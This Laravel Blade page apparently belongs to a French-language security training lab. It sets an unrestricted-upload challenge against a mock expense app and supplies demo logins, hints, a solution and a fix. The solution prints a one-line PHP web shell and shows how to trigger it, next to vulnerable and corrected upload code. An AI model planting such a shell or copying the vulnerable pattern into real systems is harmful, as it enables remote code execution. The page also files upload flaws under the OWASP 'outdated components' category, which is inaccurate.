@extends('layouts.app')

@section('title', 'Challenges OWASP A06')

@section('content')
<div class="space-y-8">

    {{-- Header --}}
    <div>
        <div class="flex items-center gap-2 mb-3">
            <span class="px-2.5 py-1 bg-red-100 text-red-700 text-xs font-bold rounded-md uppercase tracking-wider">OWASP A06:2021</span>
            <span class="px-2.5 py-1 bg-gray-100 text-gray-600 text-xs font-medium rounded-md">Vulnerable and Outdated Components</span>
        </div>
        <h1 class="text-2xl font-bold text-gray-900">Upload non restreint de fichiers</h1>
        <p class="text-sm text-gray-600 mt-2 max-w-3xl leading-relaxed">
            Cette application de gestion de notes de frais contient <strong>une vulnérabilité d'upload</strong> permettant
            l'exécution de code arbitraire sur le serveur. Votre mission : la trouver, l'exploiter, puis la corriger.
        </p>
    </div>

    {{-- Accounts card --}}
    <div class="bg-amber-50 border border-amber-200 rounded-xl p-5">
        <h2 class="text-sm font-semibold text-amber-900 mb-3">Comptes disponibles</h2>
        <div class="grid grid-cols-3 gap-3">
            <div class="bg-white rounded-lg p-3 border border-amber-100">
                <p class="text-xs font-semibold text-gray-700 mb-1">Employée</p>
                <p class="font-mono text-xs text-gray-600">alice@expensecorp.local</p>
                <p class="font-mono text-xs text-gray-400">alice123</p>
            </div>
            <div class="bg-white rounded-lg p-3 border border-amber-100">
                <p class="text-xs font-semibold text-gray-700 mb-1">Employé</p>
                <p class="font-mono text-xs text-gray-600">bob@expensecorp.local</p>
                <p class="font-mono text-xs text-gray-400">bob456</p>
            </div>
            <div class="bg-white rounded-lg p-3 border border-amber-100">
                <p class="text-xs font-semibold text-gray-700 mb-1">Administrateur RH</p>
                <p class="font-mono text-xs text-gray-600">admin@expensecorp.local</p>
                <p class="font-mono text-xs text-gray-400">rh-admin2024</p>
            </div>
        </div>
    </div>

    {{-- ───────────────── Challenge 1 ───────────────── --}}
    <div class="bg-white rounded-xl border border-gray-200 overflow-hidden">
        <div class="px-6 py-5 border-b border-gray-100">
            <div class="flex items-start justify-between">
                <div>
                    <div class="flex items-center gap-2 mb-1">
                        <span class="text-xs font-bold text-orange-600 uppercase tracking-wider">Challenge 1</span>
                        <span class="px-2 py-0.5 rounded-full text-xs font-medium bg-orange-100 text-orange-800">Upload non restreint</span>
                    </div>
                    <h3 class="text-base font-semibold text-gray-900">Exécution de code via l'upload de justificatif</h3>
                </div>
                <span class="text-amber-400 text-sm">⭐⭐⭐</span>
            </div>
        </div>
        <div class="px-6 py-5 space-y-4">
            <p class="text-sm text-gray-600 leading-relaxed">
                Connectez-vous en tant qu'Alice et créez une note de frais. Déposez un justificatif.
                Trouvez un moyen d'exécuter du code arbitraire sur le serveur.
            </p>

            {{-- Hint --}}
            <details class="border border-amber-200 rounded-lg overflow-hidden group">
                <summary class="flex items-center gap-2 px-4 py-3 bg-amber-50 cursor-pointer text-sm font-medium text-amber-800 select-none list-none">
                    <svg class="w-4 h-4 text-amber-500 transition-transform group-open:rotate-90" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
                    </svg>
                    Révéler l'indice
                </summary>
                <div class="px-4 py-3 bg-amber-50 border-t border-amber-200 space-y-1.5">
                    <p class="text-sm text-amber-800">• L'application vérifie-t-elle l'extension du fichier uploadé ? Que se passe-t-il si vous uploadez un fichier <span class="font-mono bg-amber-100 px-1 rounded">.php</span> ?</p>
                    <p class="text-sm text-amber-800">• Le nom du fichier est-il transformé (UUID, hash) avant d'être enregistré sur le disque, ou est-il conservé tel quel ?</p>
                    <p class="text-sm text-amber-800">• Regardez l'URL du lien "Ouvrir" après l'upload : dans quel répertoire le fichier est-il stocké ? Ce répertoire est-il accessible publiquement ?</p>
                </div>
            </details>

            {{-- Solution --}}
            <details class="border border-green-200 rounded-lg overflow-hidden group">
                <summary class="flex items-center gap-2 px-4 py-3 bg-green-50 cursor-pointer text-sm font-medium text-green-800 select-none list-none">
                    <svg class="w-4 h-4 text-green-500 transition-transform group-open:rotate-90" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
                    </svg>
                    Révéler la solution &amp; correction
                </summary>
                <div class="px-4 py-4 bg-green-50 border-t border-green-200 space-y-4">

                    <div>
                        <p class="text-xs font-semibold text-green-800 uppercase tracking-wider mb-2">Exploit</p>
                        <ol class="text-sm text-green-700 space-y-1 list-decimal list-inside mb-3">
                            <li>Créer un fichier <span class="font-mono bg-white px-1.5 py-0.5 rounded border border-green-200 text-xs">shell.php</span> contenant :</li>
                        </ol>
                        <pre class="bg-gray-900 text-gray-100 rounded-lg p-3 text-xs overflow-x-auto mb-3"><code><span class="text-blue-300">&lt;?php</span> system(<span class="text-yellow-300">$_GET</span>[<span class="text-green-300">'cmd'</span>]);</code></pre>
                        <ol class="text-sm text-green-700 space-y-1 list-decimal list-inside" start="2">
                            <li>L'uploader comme justificatif depuis le formulaire de l'application.</li>
                            <li>Accéder à l'URL du fichier uploadé avec le paramètre <span class="font-mono bg-white px-1.5 py-0.5 rounded border border-green-200 text-xs">?cmd=id</span> :</li>
                        </ol>
                        <pre class="bg-gray-900 text-gray-100 rounded-lg p-3 text-xs overflow-x-auto mt-3"><code>/uploads/shell.php?cmd=id
<span class="text-green-400"># uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre>
                    </div>

                    <div>
                        <p class="text-xs font-semibold text-green-800 uppercase tracking-wider mb-2">Code vulnérable &rarr; corrigé</p>
                        <pre class="bg-gray-900 text-gray-100 rounded-lg p-4 text-xs overflow-x-auto leading-relaxed"><code><span class="text-red-400">// ❌ VULNÉRABLE : AttachmentController::store()</span>

<span class="text-gray-500">// Erreur 1 : validation sans restriction de type ni de taille</span>
$request->validate([<span class="text-yellow-300">'file'</span> => [<span class="text-green-300">'required'</span>, <span class="text-green-300">'file'</span>]]);

<span class="text-gray-500">// Erreur 2 : nom original conservé ("shell.php" passe tel quel)</span>
<span class="text-yellow-300">$originalName</span> = <span class="text-yellow-300">$file</span>->getClientOriginalName();

<span class="text-gray-500">// Erreur 3 : stockage dans public/uploads/ (accessible via URL)</span>
<span class="text-yellow-300">$file</span>->move(public_path(<span class="text-green-300">'uploads'</span>), <span class="text-yellow-300">$originalName</span>);


<span class="text-green-400">// ✅ CORRIGÉ</span>

<span class="text-gray-500">// Règle 1 : validation stricte (taille + type par magic bytes)</span>
$request->validate([<span class="text-yellow-300">'file'</span> => [
    <span class="text-green-300">'required'</span>, <span class="text-green-300">'file'</span>,
    <span class="text-green-300">'max:10240'</span>,             <span class="text-gray-500">// 10 MB</span>
    <span class="text-green-300">'mimes:jpeg,png,pdf'</span>,   <span class="text-gray-500">// vérification par magic bytes</span>
]]);

<span class="text-gray-500">// Règle 2 : nom aléatoire : le nom original est ignoré</span>
<span class="text-yellow-300">$safeName</span> = Str::random(<span class="text-blue-300">32</span>) . <span class="text-green-300">'.'</span> . <span class="text-yellow-300">$file</span>->extension();

<span class="text-gray-500">// Règle 3 : stockage hors du répertoire public (disk 'private')</span>
<span class="text-yellow-300">$file</span>->storeAs(<span class="text-green-300">'uploads'</span>, <span class="text-yellow-300">$safeName</span>, disk: <span class="text-green-300">'private'</span>);</code></pre>
                    </div>

                    <div class="text-xs text-green-700 bg-green-100 rounded-lg px-3 py-2">
                        <strong>Principe OWASP :</strong> Ne jamais faire confiance aux métadonnées fournies par le client (nom, type MIME). Valider le type par magic bytes côté serveur, générer un nom aléatoire, et stocker hors du répertoire public.
                    </div>
                </div>
            </details>
        </div>
    </div>

</div>
@endsection
